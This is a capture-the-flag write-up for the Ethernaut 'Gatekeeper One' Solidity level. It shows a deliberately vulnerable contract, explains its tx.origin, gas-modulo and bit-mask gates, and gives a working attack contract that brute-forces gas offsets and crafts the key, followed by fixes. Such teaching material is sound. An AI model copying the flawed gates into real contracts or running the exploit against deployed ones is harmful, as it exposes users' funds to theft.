# Level 13: Gatekeeper One

## Goal

Pass three gates and register as the entrant.

## The contract

```solidity
modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
}
modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
}
modifier gateThree(bytes8 _gateKey) {
    require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "part one");
    require(uint32(uint64(_gateKey)) != uint64(_gateKey), "part two");
    require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "part three");
    _;
}
function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
}
```

## Vulnerability

Three weak gates:

- **gateOne** (`msg.sender != tx.origin`): call through a contract so the two differ.
- **gateTwo** (`gasleft() % 8191 == 0`): the remaining gas at the check must be a multiple of 8191. Brute-force the gas sent until it lines up.
- **gateThree**: bit-masking puzzle on the 8-byte key:
  - part one: the upper 16 bits of the lower 32 bits must be zero.
  - part two: the upper 32 bits must be non-zero.
  - part three: the lower 32 bits must equal `uint16(tx.origin)`.
  So derive the key from `tx.origin` with a mask of `0xFFFFFFFF0000FFFF`.

## Exploit

```solidity
contract GatekeeperOneAttack {
    function attack(address target) external {
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        for (uint256 i = 0; i < 8191; i++) {
            (bool ok, ) = target.call{gas: 800000 + i}(
                abi.encodeWithSignature("enter(bytes8)", key)
            );
            if (ok) break;
        }
    }
}
```

The loop sweeps gas offsets until `gasleft() % 8191 == 0` is satisfied; the key is crafted to satisfy all three gateThree checks.

## Fix

- Never use `gasleft()` in security checks; gas is fragile and implementation-dependent.
- Do not rely on `tx.origin` for identity.
- Obscure bit puzzles are not access control; use explicit authorization.

## Takeaway

"Clever" gates (gas math, tx.origin, bit masks) are not real security. They are just puzzles an attacker solves once. Real protection uses clear, robust authorization.
